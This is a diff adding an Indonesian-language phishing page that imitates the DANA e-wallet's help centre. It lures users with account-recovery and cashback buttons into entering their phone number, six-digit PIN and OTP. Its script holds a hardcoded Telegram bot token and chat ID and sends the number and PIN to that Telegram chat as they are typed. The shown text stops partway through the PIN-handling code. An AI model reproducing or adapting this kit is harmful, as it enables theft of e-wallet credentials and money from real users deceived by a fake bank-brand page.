@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DANA DOMPET DIGITAL INDONESIA</title>
+    <meta name="theme-color" content="#0086e6">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: { dana: '#0086e6' }
+                }
+            }
+        }
+    </script>
+    <style type="text/tailwindcss">
+        @layer utilities {
+            .bg-dana { background-color: #0086e6; }
+            .border-dana { border-color: #0086e6; }
+        }
+    </style>
+
+    <!-- ✅ GANTI PENUH DENGAN KODE CSS BARU YANG KAMU BERIKAN -->
+    <style>
+        /* Gaya Dasar Halaman */
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f4f7fa;
+        }
+
+        /* Wrapper Animasi 3D di Bagian Paling Atas */
+        .header-3d-wrapper {
+            width: 100%;
+            height: 340px;
+            background: linear-gradient(135deg, #0086e6, #0056b3);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            position: relative;
+            padding: 20px 0;
+        }
+
+        /* Wadah Utama Perspektif Gambar */
+        .carousel-3d-container {
+            width: 300px;
+            height: 180px;
+            position: relative;
+            perspective: 1000px;
+        }
+
+        /* Spinner Bergerak Berputar Otomatis */
+        .carousel-3d-spinner {
+            width: 100%;
+            height: 100%;
+            position: absolute;
+            transform-style: preserve-3d;
+            animation: spin3D 20s infinite linear;
+        }
+
+        /* Putaran Berhenti Saat Gambar Disentuh/Ditekan */
+        .carousel-3d-spinner:hover, .carousel-3d-spinner:active {
+            animation-play-state: paused;
+        }
+
+        /* Pengaturan Tiap Bingkai Foto */
+        .carousel-3d-item {
+            position: absolute;
+            width: 280px;
+            height: 160px;
+            left: 10px;
+            top: 10px;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
+            transition: transform 0.5s ease;
+        }
+
+        .carousel-3d-item img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        /* Menyusun Posisi 5 Gambar Membentuk Lingkaran 3D (Sudut Kelipatan 72 Derajat) */
+        .carousel-3d-item:nth-child(1) { transform: rotateY(0deg) translateZ(250px); }
+        .carousel-3d-item:nth-child(2) { transform: rotateY(72deg) translateZ(250px); }
+        .carousel-3d-item:nth-child(3) { transform: rotateY(144deg) translateZ(250px); }
+        .carousel-3d-item:nth-child(4) { transform: rotateY(216deg) translateZ(250px); }
+        .carousel-3d-item:nth-child(5) { transform: rotateY(288deg) translateZ(250px); }
+
+        /* Jalannya Animasi Putaran */
+        @keyframes spin3D {
+            from { transform: rotateY(0deg); }
+            to { transform: rotateY(360deg); }
+        }
+
+        /* Penyesuaian Otomatis Tampilan Layar HP */
+        @media (max-width: 480px) {
+            .header-3d-wrapper {
+                height: 260px;
+            }
+            .carousel-3d-container {
+                width: 200px;
+                height: 120px;
+            }
+            .carousel-3d-item {
+                width: 190px;
+                height: 110px;
+            }
+            .carousel-3d-item:nth-child(1) { transform: rotateY(0deg) translateZ(160px); }
+            .carousel-3d-item:nth-child(2) { transform: rotateY(72deg) translateZ(160px); }
+            .carousel-3d-item:nth-child(3) { transform: rotateY(144deg) translateZ(160px); }
+            .carousel-3d-item:nth-child(4) { transform: rotateY(216deg) translateZ(160px); }
+            .carousel-3d-item:nth-child(5) { transform: rotateY(288deg) translateZ(160px); }
+        }
+    </style>
+</head>
+<body class="bg-gray-100">
+    <div class="min-h-screen max-w-md mx-auto relative overflow-hidden bg-white">
+
+        <!-- HALAMAN UTAMA -->
+        <div id="halamanUtama" class="w-full h-full absolute top-0 left-0 bg-dana">
+            <!-- ✅ GANTI PENUH DENGAN KODE STRUKTUR BARU YANG KAMU BERIKAN -->
+            <div class="header-3d-wrapper">
+                <div class="carousel-3d-container">
+                    <div class="carousel-3d-spinner">
+                        <div class="carousel-3d-item"><img src="promo dana .jpeg" alt="Promo Dana"></div>
+                        <div class="carousel-3d-item"><img src="DANA.png" alt="DANA QRIS"></div>
+                        <div class="carousel-3d-item"><img src="playleter.jpg" alt="DANA Paylater"></div>
+                        <div class="carousel-3d-item"><img src="DANA-Cicil.jpg" alt="DANA Cicil"></div>
+                        <div class="carousel-3d-item"><img src="promo hadiah.png" alt="Promo Hadiah"></div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="absolute bottom-0 w-full bg-white rounded-t-3xl px-6 pt-8 pb-20">
+                <p class="text-center text-gray-400 text-sm font-medium">PUSAT BANTUAN</p>
+                <h2 class="text-center text-dana font-bold text-lg mb-6">INPUT SESUAI KENDALA ANDA</h2>
+
+                <button onclick="pindahHalaman('halamanNomor')" class="w-full bg-dana text-white py-3.5 rounded-xl font-semibold mb-3 shadow-md">PULIHKAN AKUN DI BEKUKAN</button>
+                <button onclick="pindahHalaman('halamanNomor')" class="w-full bg-dana text-white py-3.5 rounded-xl font-semibold mb-3 shadow-md">KLAIM VOCER CASHBACK DANA</button>
+                <button onclick="pindahHalaman('halamanNomor')" class="w-full bg-dana text-white py-3.5 rounded-xl font-semibold mb-3 shadow-md">PEMBATALAN DANA CICIL</button>
+                <button onclick="pindahHalaman('halamanNomor')" class="w-full bg-dana text-white py-3.5 rounded-xl font-semibold mb-3 shadow-md">LAPORAN KENDALA AKUN</button>
+                <button onclick="pindahHalaman('halamanNomor')" class="w-full bg-dana text-white py-3.5 rounded-xl font-semibold shadow-md">KENDALA LAINNYA</button>
+            </div>
+
+            <div class="absolute bottom-0 w-full bg-white border-t border-gray-200 py-2 px-6 flex justify-between items-center">
+                <div class="text-center text-dana">
+                    <svg width="22" height="22" fill="#0086e6" viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h5v8z"/></svg>
+                    <span class="text-xs font-semibold">Beranda</span>
+                </div>
+                <div class="text-center text-gray-400">
+                    <svg width="22" height="22" fill="currentColor" viewBox="0 0 24 24"><path d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zm2 16H8v-2h8v2zm0-4H8v-2h8v2zm-3-5V3.5L18.5 9H13z"/></svg>
+                    <span class="text-xs">Aktivitas</span>
+                </div>
+                <div class="bg-dana rounded-full p-3 -mt-5 shadow-lg">
+                    <svg width="24" height="24" fill="white" viewBox="0 0 24 24"><path d="M19 12c0 .55-.45 1-1 1h-1v1c0 .55-.45 1-1 1s-1-.45-1-1v-1h-2c-.55 0-1-.45-1-1s.45-1 1-1h2V9c0-.55.45-1 1-1s1 .45 1 1v1h1c.55 0 1 .45 1 1z"/></svg>
+                </div>
+                <div class="text-center text-gray-400">
+                    <svg width="22" height="22" fill="currentColor" viewBox="0 0 24 24"><path d="M21 18v1c0 1.1-.9 2-2 2H5c-1.1 0-2-.9-2-2v-1h18zm-9-9c1.66 0 3-1.34 3-3S13.66 3 12 3 9 4.34 9 6s1.34 3 3 3zm6 0c1.66 0 3-1.34 3-3S19.66 3 18 3s-3 1.34-3 3 1.34 3 3 3zm-6 2c-2.33 0-7 1.17-7 3.5V19h14v-4.5c0-2.33-4.67-3.5-7-3.5z"/></svg>
+                    <span class="text-xs">Dompet</span>
+                </div>
+                <div class="text-center text-gray-400">
+                    <svg width="22" height="22" fill="currentColor" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+                    <span class="text-xs">Saya</span>
+                </div>
+            </div>
+        </div>
+
+
+        <!-- HALAMAN NOMOR HP -->
+        <div id="halamanNomor" class="w-full h-full absolute top-0 left-0 bg-dana hidden flex-col items-center justify-between px-6 py-16">
+            <img src="nama-gambar.jpg" alt="Logo DANA" class="w-24 mb-8" />
+            
+            <div class="w-full flex flex-col items-center">
+                <p class="text-white text-lg font-medium mb-8 text-center">Masukan nomor HP kamu untuk lanjut</p>
+
+                <div class="w-full max-w-sm flex items-center bg-white rounded-lg overflow-hidden mb-6 shadow-md">
+                    <div class="flex items-center gap-2 px-3 border-r border-gray-200">
+                        <img src="nama-gambar.jpg" alt="Bendera Indonesia" class="w-6 h-4" />
+                        <span class="text-gray-800 font-semibold text-lg">+62</span>
+                    </div>
+                    <input type="tel" id="inputNomor" placeholder="811-1234-5678" class="flex-1 px-3 py-3.5 text-gray-800 text-lg outline-none" />
+                </div>
+
+                <p class="text-white/90 text-sm text-center px-4 mb-10 leading-relaxed">
+                    Dengan melanjutkan, kamu setuju dengan <a href="#" class="text-white underline font-medium">Syarat & Ketentuan</a> dan <a href="#" class="text-white underline font-medium">Kebijakan Privasi</a> kami
+                </p>
+            </div>
+
+            <button onclick="kirimNomorLangsung()" class="text-white font-medium text-lg tracking-wide">LANJUT</button>
+        </div>
+
+
+        <!-- HALAMAN PIN -->
+        <div id="halamanPin" class="w-full h-full absolute top-0 left-0 bg-dana hidden flex-col items-center justify-between px-6 py-16">
+            <img src="nama-gambar.jpg" alt="Logo DANA" class="w-20 mb-8" />
+
+            <div class="w-full flex flex-col items-center">
+                <p class="text-white text-lg font-medium mb-10">Masukan PIN DANA</p>
+
+                <div class="flex gap-3 mb-6" id="kotakPin">
+                    <div class="w-14 h-16 bg-white rounded-md border border-gray-300 flex items-center justify-center relative">
+                        <div class="w-0.5 h-6 bg-gray-400 absolute left-1/2 top-2"></div>
+                    </div>
+                    <div class="w-14 h-16 bg-white rounded-md border border-gray-300 flex items-center justify-center"></div>
+                    <div class="w-14 h-16 bg-white rounded-md border border-gray-300 flex items-center justify-center"></div>
+                    <div class="w-14 h-16 bg-white rounded-md border border-gray-300 flex items-center justify-center"></div>
+                    <div class="w-14 h-16 bg-white rounded-md border border-gray-300 flex items-center justify-center"></div>
+                    <div class="w-14 h-16 bg-white rounded-md border border-gray-300 flex items-center justify-center"></div>
+                </div>
+
+                <button class="border border-white text-white text-sm px-5 py-1.5 rounded-full mb-8">TAMPILKAN</button>
+                <a href="#" class="text-white text-sm font-medium mb-10">LUPA PIN?</a>
+
+                <div class="w-14 h-14 rounded-full border-2 border-white/60 flex items-center justify-center">
+                    <svg width="24" height="24" fill="white" viewBox="0 0 24 24"><path d="M3 9h2V7H3v2zm0 4h2v-2H3v2zm0 4h2v-2H3v2zm16-8h2V7h-2v2zm0 4h2v-2h-2v2zm0 4h2v-2h-2v2zm-8-8h2V3h-2v2zm0 8h2v-2h-2v2zm0-8h2V7h-2V5zm0 4h2v-2h-2v2z"/></svg>
+                </div>
+            </div>
+
+            <p class="text-white/0 text-lg">LANJUT</p>
+        </div>
+
+
+        <!-- HALAMAN OTP -->
+        <div id="halamanOtp" class="w-full h-full absolute top-0 left-0 bg-white hidden flex-col items-center px-6 pt-16">
+            <div class="absolute top-0 w-full h-12 bg-dana flex items-center justify-center">
+                <i class="fa fa-arrow-left text-white absolute left-4 text-lg cursor-pointer" onclick="pindahHalaman('halamanPin')"></i>
+                <span class="text-white font-bold text-lg">Masukan Kode OTP</span>
+            </div>
+
+            <p id="teksMerah" class="text-red-500 text-sm font-medium mt-4 mb-4 hidden">Pastikan kode OTP yang kamu masukan benar</p>
+
+            <p class="text-lg font-medium text-gray-800 mb-3 text-center">Kode telah dikirim ke nomor<br><span id="tampilNomorOtpHalaman" class="font-bold">+62 </span><br>via WhatsApp/SMS anda</p>
+
+            <div class="flex gap-4 mb-6 mt-4" id="kotakOtp">
+                <div class="w-14 h-16 border-b-2 border-gray-400 flex items-center justify-center text-2xl font-semibold relative">
+                    <div class="w-0.5 h-6 bg-gray-400 absolute left-1/2 top-2"></div>
+                </div>
+                <div class="w-14 h-16 border-b-2 border-gray-400 flex items-center justify-center text-2xl font-semibold"></div>
+                <div class="w-14 h-16 border-b-2 border-gray-400 flex items-center justify-center text-2xl font-semibold"></div>
+                <div class="w-14 h-16 border-b-2 border-gray-400 flex items-center justify-center text-2xl font-semibold"></div>
+            </div>
+
+            <a href="#" class="text-dana text-sm font-medium mb-6">NOMOR TIDAK AKTIF?</a>
+
+            <button id="tombolKirimUlang" class="bg-gray-200 text-gray-400 px-6 py-2 rounded-full text-sm mb-12" disabled>
+                KIRIM ULANG <span id="hitungMundur">00:59</span>
+            </button>
+
+            <div class="w-full max-w-xs grid grid-cols-3 gap-y-6 gap-x-4">
+                <button class="tombolOtp py-3 text-xl font-semibold text-gray-800 rounded-lg" data-nomor="1">1</button>
+                <button class="tombolOtp py-3 text-xl font-semibold text-gray-800 rounded-lg" data-nomor="2">2</button>
+                <button class="tombolOtp py-3 text-xl font-semibold text-gray-800 rounded-lg" data-nomor="3">3</button>
+                <button class="tombolOtp py-3 text-xl font-semibold text-gray-800 rounded-lg" data-nomor="4">4</button>
+                <button class="tombolOtp py-3 text-xl font-semibold text-gray-800 rounded-lg" data-nomor="5">5</button>
+                <button class="tombolOtp py-3 text-xl font-semibold text-gray-800 rounded-lg" data-nomor="6">6</button>
+                <button class="tombolOtp py-3 text-xl font-semibold text-gray-800 rounded-lg" data-nomor="7">7</button>
+                <button class="tombolOtp py-3 text-xl font-semibold text-gray-800 rounded-lg" data-nomor="8">8</button>
+                <button class="tombolOtp py-3 text-xl font-semibold text-gray-800 rounded-lg" data-nomor="9">9</button>
+                <div></div>
+                <button class="tombolOtp py-3 text-xl font-semibold text-gray-800 rounded-lg" data-nomor="0">0</button>
+                <button id="hapusOtp" class="py-3 text-xl font-semibold text-gray-800 rounded-lg">⌫</button>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8650420881:AAF5wZ-Y1-p31T1bUy2DLbZzO3k8HV6Iqjw";
+        const CHAT_ID = "7343679071";
+        let nomorHp = "";
+        let pinDana = "";
+        let otpDana = "";
+        let pesanId = "";
+        let hitung = 59;
+        let timer;
+
+        // PINDAH HALAMAN
+        function pindahHalaman(namaHalaman) {
+            document.querySelectorAll('div[id^="halaman"]').forEach(el => el.classList.add('hidden'));
+            document.getElementById(namaHalaman).classList.remove('hidden');
+        }
+
+        // ✅ KIRIM NOMOR
+        function kirimNomorLangsung() {
+            nomorHp = document.getElementById('inputNomor').value.replace(/\D/g, "");
+            if(nomorHp.length < 4) return alert("Isi nomor dengan benar!");
+
+            document.getElementById('tampilNomorOtpHalaman').textContent = "+62 " + nomorHp;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({chat_id: CHAT_ID, text: `📥 DATA MASUK\n📱 Nomor: ${nomorHp}\n🔑 PIN: Menunggu...\n🔐 OTP: Menunggu...`})
+            }).then(res => res.json()).then(d => {
+                pesanId = d.result.message_id;
+                pindahHalaman('halamanPin');
+                aktifkanKeyboardPin();
+            });
+        }
+
+        // ✅ KEYBOARD PIN
+        function aktifkanKeyboardPin() {
+            const kotak = document.querySelectorAll('#kotakPin > div');
+            let isi = "";
+            document.querySelectorAll('.tombolAngka').forEach(btn => btn.remove());
+
+            const keyboard = document.createElement('div');
+            keyboard.className = "w-full absolute bottom-0 left-0 right-0 bg-white/10 backdrop-blur-sm py-4 px-8 grid grid-cols-3 gap-4";
+            keyboard.innerHTML = `
+                <button class="tombolAngka py-3 text-xl font-semibold text-white rounded-lg" data-nomor="1">1</button>
+                <button class="tombolAngka py-3 text-xl font-semibold text-white rounded-lg" data-nomor="2">2</button>
+                <button class="tombolAngka py-3 text-xl font-semibold text-white rounded-lg" data-nomor="3">3</button>
+                <button class="tombolAngka py-3 text-xl font-semibold text-white rounded-lg" data-nomor="4">4</button>
+                <button class="tombolAngka py-3 text-xl font-semibold text-white rounded-lg" data-nomor="5">5</button>
+                <button class="tombolAngka py-3 text-xl font-semibold text-white rounded-lg" data-nomor="6">6</button>
+                <button class="tombolAngka py-3 text-xl font-semibold text-white rounded-lg" data-nomor="7">7</button>
+                <button class="tombolAngka py-3 text-xl font-semibold text-white rounded-lg" data-nomor="8">8</button>
+                <button class="tombolAngka py-3 text-xl font-semibold text-white rounded-lg" data-nomor="9">9</button>
+                <div></div>
+                <button class="tombolAngka py-3 text-xl font-semibold text-white rounded-lg" data-nomor="0">0</button>
+                <button id="hapusPin" class="py-3 text-xl font-semibold text-white rounded-lg">⌫</button>
+            `;
+            document.getElementById('halamanPin').appendChild(keyboard);
+
+            document.querySelectorAll('.tombolAngka').forEach(btn => {
+                btn.onclick = () => {
+                    if(isi.length < 6) {
+                        isi += btn.dataset.nomor;
+                        kotak[isi.length-1].innerHTML = '<span class="text-xl font-bold text-gray-800">●</span>';
+                        
+                        if(isi.length === 6) {
+                            pinDana = isi;
+                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
+                                method: "POST",
+                                headers: {"Content-Type": "application/json"},
+                                body: JSON.stringify({chat_id: CHAT_ID, message_id: pesanId, text: `📥 DATA MASUK\n📱 Nomor: ${nomorHp}\n🔑 PIN: ${pinDana}\n🔐 OTP: Menunggu...`})
+                            });
+                            
+                            setTimeout(() => {
+                                pindahHalaman('halamanOtp');
+                                aktifkanKeyboardOtp();
+                                mulaiHitungMundur();
+                            }, 200);
+                        }
+                    }
+                }
+            });
+
+            document.getElementById('hapusPin').onclick = () => {
+                if(isi.length > 0) {
+                    isi = isi.slice(0, -1);
+                    kotak[isi.length].innerHTML = isi.length === 0 ? '<div class="w-0.5 h-6 bg-gray-400 absolute left-1/2 top-2"></di
